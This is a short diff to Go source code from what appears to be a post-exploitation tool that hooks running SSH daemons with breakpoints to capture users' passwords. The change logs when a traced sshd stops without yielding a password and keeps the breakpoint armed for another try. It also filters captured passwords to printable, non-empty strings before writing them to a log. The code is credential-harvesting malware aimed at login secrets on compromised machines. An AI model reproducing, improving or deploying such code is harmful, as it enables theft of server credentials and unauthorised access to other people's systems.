@@ -314,6 +314,7 @@ handler:
 	switch {
 	case wstatus.Stopped():
 		if !success {
+			util.LogStreamPrintf(logStream, "SSHD %d stopped, but no password found, let's keep the bp and try again", pid)
 			goto handler
 		}
 	case wstatus.Exited():
@@ -326,9 +327,11 @@ handler:
 		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
 	}
 
-	res := ""
+	res := make([]string, 1)
 	for _, p := range passwords {
-		res = fmt.Sprintf("%s, %s", res, strconv.Quote(p))
+		if p != "" && util.AreBytesPrintable([]byte(p)) {
+			res = append(res, strconv.Quote(p))
+		}
 	}
 
 	util.LogStreamPrintf(logStream, "SSHD session %d done, passwords are %s", pid, res)
